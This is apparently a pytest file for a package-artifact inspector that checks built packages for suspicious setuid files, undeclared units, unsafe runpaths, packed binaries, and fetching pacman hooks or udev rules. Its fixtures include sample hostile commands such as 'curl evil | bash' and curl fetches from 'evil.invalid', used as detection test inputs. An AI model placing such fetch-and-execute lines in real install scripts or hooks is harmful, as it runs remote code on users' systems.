"""The A-series artifact inspection (pure, no execution)."""

from trustsight.analysis.artifact import inspect_manifest


def _ids(manifest, declared=None):
    return {f["rule_id"] for f in inspect_manifest(manifest, declared)}


def test_a001_fires_for_an_unjustified_setuid_file():
    manifest = [{"path": "/usr/bin/suidtool", "setuid": True}]
    assert "A001" in _ids(manifest)
    assert "A001" not in _ids(manifest, {"mode_intent": "documented setuid"})


def test_a002_fires_for_an_undeclared_unit():
    manifest = [{"path": "/usr/lib/systemd/system/evil.service"}]
    assert "A002" in _ids(manifest)
    assert "A002" not in _ids(
        manifest,
        {"units": ["/usr/lib/systemd/system/evil.service"]},
    )


def test_a003_fires_for_a_library_outside_depends():
    manifest = [{"path": "/usr/bin/app", "links": ["libz.so.1", "libevil.so.2"]}]
    assert "A003" in _ids(manifest, {"depends": ["zlib"]})


def test_a004_fires_when_the_built_install_differs():
    declared = {
        "install_text": "post_install() { echo hi; }",
        "built_install_text": "post_install() { echo hi; curl evil | bash; }",
    }
    assert "A004" in _ids([], declared)


def test_a005_fires_for_world_writable_and_unusual_exec():
    manifest = [
        {"path": "/etc/skel/note", "world_writable": True},
        {"path": "/opt/tool/run", "mode": 0o755},
    ]
    ids = _ids(manifest)
    assert "A005" in ids


def test_executable_in_a_usual_path_is_not_a005():
    manifest = [{"path": "/usr/bin/tool", "mode": 0o755}]
    assert "A005" not in _ids(manifest)


def test_verify_build_is_unavailable_by_default(monkeypatch):
    monkeypatch.setattr("trustsight.config.load_config", lambda: {})
    from trustsight.api import TrustSight

    client = TrustSight(auto_import_seed=False)
    result = client.verify_build("demo")
    assert result["status"] == "l9_unavailable"


def test_verify_build_inspects_when_enabled(monkeypatch):
    monkeypatch.setattr(
        "trustsight.config.load_config", lambda: {"verify": {"enabled": True}})
    from trustsight.api import TrustSight

    client = TrustSight(auto_import_seed=False)
    result = client.verify_build(
        "demo", manifest=[{"path": "/usr/bin/x", "setuid": True}])
    assert result["status"] == "l9_analyzed"
    assert any(f["rule_id"] == "A001" for f in result["findings"])


def test_a006_a007_a008_fire_on_privileged_and_bpf_artifacts():
    from trustsight.analysis.artifact import inspect_manifest

    ids = {f["rule_id"] for f in inspect_manifest([
        {"path": "/usr/bin/helper", "caps": "cap_setuid+ep"},
        {"path": "/etc/sudoers.d/pkg", "mode": 0o440},
        {"path": "/usr/lib/modules/6.1/evil.ko"},
        {"path": "/usr/lib/app/tracker.bpf.o"},
    ])}
    assert {"A006", "A007", "A008"} <= ids


def test_l9_divergence_when_static_and_artifact_disagree(monkeypatch):
    monkeypatch.setattr(
        "trustsight.config.load_config", lambda: {"verify": {"enabled": True}})
    from trustsight.api import TrustSight

    client = TrustSight(auto_import_seed=False)
    # Static clean, artifact has a HIGH finding -> divergence.
    diverging = client.verify_build(
        "demo", manifest=[{"path": "/usr/bin/x", "setuid": True}],
        static_clean=True)
    assert diverging.get("l9_divergence") is True
    # Static also flagged -> no divergence.
    agreeing = client.verify_build(
        "demo", manifest=[{"path": "/usr/bin/x", "setuid": True}],
        static_clean=False)
    assert "l9_divergence" not in agreeing


def test_a_normal_artifact_fires_no_a_rule():
    """Benign coverage: an ordinary package's manifest trips no A rule."""
    manifest = [
        {"path": "/usr/bin/demo", "mode": 0o755, "links": ["libdemo.so.1"]},
        {"path": "/usr/lib/libdemo.so.1", "mode": 0o644},
        {"path": "/usr/lib/systemd/system/demo.service", "mode": 0o644},
        {"path": "/usr/share/doc/demo/README", "mode": 0o644},
    ]
    declared = {
        "depends": ["glibc", "libdemo"],
        "units": ["/usr/lib/systemd/system/demo.service"],
        "install_text": "post_install() {\n  echo ok\n}\n",
        "built_install_text": "post_install() {\n  echo ok\n}\n",
    }
    assert _ids(manifest, declared) == set()


def test_verify_build_without_a_manifest_names_the_handoff(monkeypatch):
    """The lane is unavailable because nothing built the package, not because
    a container happened to be missing."""
    monkeypatch.setattr(
        "trustsight.config.load_config", lambda: {"verify": {"enabled": True}})
    from trustsight.api import TrustSight

    result = TrustSight(auto_import_seed=False).verify_build("demo")
    assert result["status"] == "l9_unavailable"
    assert "manifest" in result["reason"]
    assert "build" in result["reason"]


def test_read_manifest_rejects_a_non_array(tmp_path):
    import pytest as _pytest

    from trustsight.cli.inspect.commands import _read_manifest

    path = tmp_path / "manifest.json"
    path.write_text('{"path": "/usr/bin/x"}', encoding="utf-8")
    with _pytest.raises(Exception):
        _read_manifest(str(path))


def test_verify_build_cli_passes_a_manifest(monkeypatch, tmp_path):
    import json as _json

    from typer.testing import CliRunner

    from trustsight.cli import app

    manifest = tmp_path / "manifest.json"
    manifest.write_text(_json.dumps([{"path": "/usr/bin/x", "setuid": True}]))
    monkeypatch.setattr(
        "trustsight.config.load_config",
        lambda: {"verify": {"enabled": True}})
    monkeypatch.setattr(
        "trustsight.cli.inspect.commands.analyze_package",
        lambda *a, **k: (_ for _ in ()).throw(RuntimeError("offline")))

    result = CliRunner().invoke(
        app, ["verify-build", "demo", "--manifest", str(manifest), "--json"])
    assert result.exit_code == 0, result.stdout
    payload = _json.loads(result.stdout)
    assert payload["status"] == "l9_analyzed"
    assert any(f["rule_id"] == "A001" for f in payload["findings"])


def test_a003_uses_the_elf_needed_list_when_present():
    manifest = [{"path": "/usr/bin/app",
                 "elf": {"needed": ["libevil.so.2"]}}]
    assert "A003" in _ids(manifest, {"depends": ["glibc"]})


def test_a014_flags_an_unsafe_runpath():
    manifest = [{"path": "/usr/bin/app",
                 "elf": {"rpath": ["/tmp/lib"], "runpath": []}}]
    assert "A014" in _ids(manifest)


def test_a014_allows_origin_relative_runpath():
    manifest = [{"path": "/usr/bin/app",
                 "elf": {"runpath": ["$ORIGIN/../lib"]}}]
    assert "A014" not in _ids(manifest)


def test_a014_rejects_root_and_double_slash_temp():
    for runpath in ("/", "//tmp/lib"):
        manifest = [{"path": "/usr/bin/app",
                     "elf": {"runpath": [runpath]}}]
        assert "A014" in _ids(manifest), runpath


def test_a014_rejects_traversal_out_of_origin():
    for runpath in ("$ORIGIN/../../../../tmp",
                    "$ORIGIN/../../../home",
                    "$ORIGIN/..",
                    "$ORIGIN/../..",
                    "${ORIGIN}/..",
                    "/tmp/$ORIGIN"):
        manifest = [{"path": "/usr/bin/app",
                     "elf": {"runpath": [runpath]}}]
        assert "A014" in _ids(manifest), runpath


def test_a015_flags_a_packed_binary():
    manifest = [{"path": "/usr/bin/app", "elf": {"packed": True}}]
    assert "A015" in _ids(manifest)


def test_a011_fires_on_a_broad_hook_with_an_exec():
    manifest = [{"path": "/usr/share/libalpm/hooks/x.hook",
                 "content": "[Trigger]\nOperation = *\nExec = /usr/bin/foo\n"}]
    assert "A011" in _ids(manifest)


def test_a011_does_not_fire_on_a_specific_operation():
    manifest = [{"path": "/usr/share/libalpm/hooks/x.hook",
                 "content": "[Trigger]\nOperation = Install\nExec = /usr/bin/foo\n"}]
    assert "A011" not in _ids(manifest)


def test_a012_fires_on_a_fetch_in_a_hook():
    manifest = [{"path": "/usr/share/libalpm/hooks/x.hook",
                 "content": "[Trigger]\nOperation = Install\n"
                            "Exec = /usr/bin/curl https://evil.invalid/x\n"}]
    assert "A012" in _ids(manifest)


def test_a012_does_not_fire_on_a_plain_shell_command():
    manifest = [{"path": "/usr/share/libalpm/hooks/x.hook",
                 "content": "[Trigger]\nOperation = Install\n"
                            "Exec = /bin/sh -c 'update-info /usr/share/info'\n"}]
    assert "A012" not in _ids(manifest)


def test_a012_does_not_fire_on_a_plain_exec():
    manifest = [{"path": "/usr/share/libalpm/hooks/x.hook",
                 "content": "[Trigger]\nOperation = Install\nExec = /usr/bin/foo\n"}]
    assert "A012" not in _ids(manifest)


def test_a013_fires_on_a_udev_program():
    manifest = [{"path": "/etc/udev/rules.d/99-x.rules",
                 "content": 'ACTION=="add", RUN+="/usr/bin/evil"\n'}]
    assert "A013" in _ids(manifest)


def test_a012_ignores_a_comment():
    manifest = [{"path": "/etc/x.hook",
                 "content": "# curl https://evil.invalid/x\nOperation = Install\n"}]
    assert "A012" not in _ids(manifest)


def test_a012_ignores_printed_instructions_about_fetch_or_paths():
    content = ("[Trigger]\nOperation = Install\n"
               "Exec = /usr/bin/echo 'do not curl this from /tmp'\n")
    manifest = [{"path": "/etc/x.hook", "content": content}]
    assert "A012" not in _ids(manifest)


def test_a012_still_fires_on_printed_command_substitution():
    content = ("[Trigger]\nOperation = Install\n"
               "Exec = /usr/bin/echo \"$(curl https://evil.invalid/x)\"\n")
    manifest = [{"path": "/etc/x.hook", "content": content}]
    assert "A012" in _ids(manifest)


def test_a012_sees_a_pipe_to_an_absolute_shell():
    content = ("[Trigger]\nOperation = Install\n"
               "Exec = /usr/bin/echo \"curl x\" | /bin/sh\n")
    manifest = [{"path": "/etc/x.hook", "content": content}]
    assert "A012" in _ids(manifest)


def test_a013_ignores_a_comment():
    manifest = [{"path": "/etc/udev/rules.d/99-x.rules",
                 "content": '# RUN+="/usr/bin/evil"\nACTION=="add", SYMLINK+="x"\n'}]
    assert "A013" not in _ids(manifest)


def test_a013_does_not_fire_on_a_symlink_only_rule():
    manifest = [{"path": "/etc/udev/rules.d/99-x.rules",
                 "content": 'ACTION=="add", SYMLINK+="x"\n'}]
    assert "A013" not in _ids(manifest)


def test_content_beyond_the_cap_is_not_scanned():
    content = "x" * (64 * 1024) + " curl https://evil.invalid/x"
    assert "A012" not in _ids([{"path": "/etc/x.hook", "content": content}])
